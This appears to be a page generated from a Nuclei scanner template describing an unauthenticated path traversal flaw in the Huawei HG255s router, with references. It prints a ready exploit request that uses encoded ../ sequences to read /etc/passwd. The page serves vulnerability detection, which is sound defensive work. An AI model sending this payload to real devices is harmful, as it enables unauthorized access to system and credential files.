# Nuclei Template: Huawei HG255s - Local File Inclusion
**Template ID:** huawei-hg255s-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`huawei-hg255s-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Huawei HG255s is vulnerable to local file inclusion due to insufficient validation of the received HTTP requests. A remote attacker may access the local files on the device without authentication.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
```

## References
- https://cxsecurity.com/issue/WLB-2017090053
- https://www.youtube.com/watch?v=n02toTFkLOU
